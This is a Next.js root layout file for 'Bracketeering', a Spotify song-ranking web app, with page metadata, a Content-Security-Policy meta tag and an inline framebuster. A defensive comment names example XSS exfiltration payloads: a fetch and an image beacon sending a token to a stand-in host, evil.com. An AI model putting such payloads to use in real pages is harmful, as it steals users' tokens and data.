import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
  display: "swap",
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
  display: "swap",
});

const SITE_URL = "https://jhomer192.github.io/bracketeering";
const TITLE = "Bracketeering — Vote your way to your real top 10";
const DESCRIPTION =
  'Vote "this or that" on 128 of your songs. Walk away with a real top 10 — and a Spotify playlist that proves it.';

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: { default: TITLE, template: "%s · Bracketeering" },
  description: DESCRIPTION,
  applicationName: "Bracketeering",
  authors: [{ name: "Jack Homer" }],
  keywords: [
    "Spotify",
    "music ranking",
    "top songs",
    "playlist",
    "tournament bracket",
    "music discovery",
  ],
  openGraph: {
    type: "website",
    url: SITE_URL,
    siteName: "Bracketeering",
    title: TITLE,
    description: DESCRIPTION,
  },
  twitter: {
    card: "summary_large_image",
    title: TITLE,
    description: DESCRIPTION,
  },
  robots: { index: true, follow: true },
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  // Match brand bg so the iOS status bar / Android URL bar tint into the app.
  themeColor: "#09090b",
  colorScheme: "dark",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    // `data-theme="dark"` + `color-scheme: dark` keeps native form controls
    // (selects, scrollbars) in dark mode regardless of the user's OS pref.
    // Bracketeering is intentionally dark-only — see globals.css comment.
    <html
      lang="en"
      data-theme="dark"
      style={{ colorScheme: "dark" }}
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
    >
      <head>
        {/* Security posture for a GitHub-Pages static SPA — no HTTP headers
            available, so the meaningful pieces live in <meta> + a tiny
            framebuster.
              - CSP via meta has real teeth on connect-src and img-src:
                an XSS injecting `fetch("https://evil.com")` is blocked,
                and an `<img src="//evil.com/log?token=...">` is blocked.
              - script-src needs 'unsafe-inline' because Next.js's static
                export inlines hashed bootstrap scripts with no nonce. We
                still block off-origin <script src> via 'self'.
              - frame-ancestors is IGNORED in meta (CSP3 mandates HTTP
                header only). Clickjacking protection is enforced below
                via the inline framebuster.
              - referrer policy: don't leak the OAuth ?code= or ?state=
                back to upstream sites if a user middle-clicks a link. */}
        <meta
          httpEquiv="Content-Security-Policy"
          content={[
            "default-src 'self'",
            // open.spotify.com hosts the Iframe Embed API script
            // (`/embed/iframe-api/v1`) that powers the in-bracket preview
            // player. Spotify deprecated `preview_url` in late 2024, so the
            // embed iframe is the only path that actually plays audio.
            "script-src 'self' 'unsafe-inline' https://open.spotify.com",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' https://i.scdn.co https://mosaic.scdn.co data: blob:",
            "font-src 'self' data:",
            "connect-src 'self' https://api.spotify.com https://accounts.spotify.com",
            "form-action https://accounts.spotify.com 'self'",
            "frame-src https://open.spotify.com",
            "base-uri 'self'",
            "object-src 'none'",
          ].join("; ")}
        />
        <meta name="referrer" content="strict-origin-when-cross-origin" />
        <meta name="color-scheme" content="dark" />
        {/* JS framebuster — replaces the missing X-Frame-Options. If the page
            is being framed by a different origin, redirect the top frame to
            our URL so the embedding site loses control. The cross-origin
            `top.location` read deliberately throws on hostile frames; we
            catch and force the redirect via `top = self`. */}
        <script
          // eslint-disable-next-line react/no-danger
          dangerouslySetInnerHTML={{
            __html:
              "try{if(self!==top){top.location=self.location}}catch(e){top.location=self.location}",
          }}
        />
      </head>
      <body className="min-h-full flex flex-col bg-[var(--bg)] text-[var(--fg)]">
        {children}
      </body>
    </html>
  );
}
